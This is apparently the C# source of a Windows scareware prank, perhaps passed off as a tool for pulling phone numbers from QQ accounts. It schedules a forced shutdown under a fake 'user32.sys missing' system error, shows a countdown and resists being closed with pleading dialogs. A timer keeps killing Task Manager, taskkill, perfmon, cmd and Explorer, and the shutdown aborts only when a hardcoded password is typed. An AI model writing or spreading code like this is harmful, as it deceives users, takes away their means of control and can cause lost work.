using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace wnexe
{
    public partial class Form1 : System.Windows.Forms.Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        int time = 180;

        private void Form_Load(object sender, EventArgs e)
        {
            Hide();

            Type oleType = Type.GetTypeFromProgID("Shell.Application");
            object oleObject = Activator.CreateInstance(oleType);
            oleType.InvokeMember("ToggleDesktop", BindingFlags.InvokeMethod, null, oleObject, null);

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardInput = true;
            process.Start();
            process.StandardInput.AutoFlush = true;

            process.StandardInput.WriteLine("shutdown /s /t 200 /f /c \"系统错误： “user32.sys” 丢失。系统应立即重启\" /d u:5:15");

            label_time.Text = string.Format("{0:D2}:{1:D2}", (time - time % 60) / 60, time % 60);

            Show();

            timer.Enabled = true;

            process.StandardInput.WriteLine("start exit");
            process.StandardInput.WriteLine("exit");
            process.WaitForExit(1000);

            timer_kill.Enabled = true;
        }

        bool closed = false;

        private void Form_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (closed)
            {
                一键从QQ号抓取手机号.Form.closed = 2;
            }
            else
            {
                var r = MessageBox.Show("你正在放弃获得免费修复的唯一机会!", "确定关闭?", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
                if (r == DialogResult.OK)
                {
                    r = MessageBox.Show("一定要抛弃人家?", "嘤嘤嘤!", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
                    if (r == DialogResult.OK)
                    {
                        r = MessageBox.Show("点取消就告诉你密码!", "即将告密!", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
                        if (r == DialogResult.OK)
                        {
                            MessageBox.Show("再想想吧!我不想离开你!", "再想想吧!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                        else
                        {
                            MessageBox.Show("密码是“■23■■■■■”!\r\n(部分数据丢失!)", "部分数据丢失!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
                e.Cancel = true;
            }
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            time--;
            if (time == 0)
            {
                label_time.Text = "00:00";
                timer.Enabled = false;
                label_error.Text = "时间到";
                textBox.Enabled = false;
                return;
            }
            label_time.Text = string.Format("{0:D2}:{1:D2}", (time - time % 60) / 60, time % 60);
        }

        private void textBox_TextChanged(object sender, EventArgs e)
        {
            if (textBox.Text == "12345679")
            {
                timer.Enabled = timer_kill.Enabled = false;
                label_error.Text = "密码正确";
                textBox.Enabled = false;
                closed = true;
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardInput = true;
                process.Start();
                process.StandardInput.AutoFlush = true;

                process.StandardInput.WriteLine("shutdown /a");
                process.StandardInput.WriteLine("explorer");
                process.StandardInput.WriteLine("exit");
                process.WaitForExit(1000);
                ControlBox = true;
            }
        }

        private void timer_kill_Tick(object sender, EventArgs e)
        {
            Process[] taskkill = Process.GetProcessesByName("taskkill");
            foreach (var p in taskkill)
            {
                try
                {
                    p.Kill();
                }
                catch (Win32Exception)
                { }
            }
            Process[] taskmgr = Process.GetProcessesByName("taskmgr");
            foreach (var p in taskmgr)
            {
                try
                {
                    p.Kill();
                }
                catch (Win32Exception)
                { }
            }
            Process[] perfmon = Process.GetProcessesByName("perfmon");
            foreach (var p in perfmon)
            {
                try
                {
                    p.Kill();
                }
                catch (Win32Exception)
                { }
            }
            Process[]cmd = Process.GetProcessesByName("cmd");
            foreach (var p in cmd)
            {
                try
                {
                    p.Kill();
                }
                catch (Win32Exception)
                { }
            }
            Process[] explorer = Process.GetProcessesByName("explorer");
            foreach (var p in explorer)
            {
                try
                {
                    p.Kill();
                }
                catch (Win32Exception)
                { }
            }
        }

        private void statusStrip_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }
    }
}
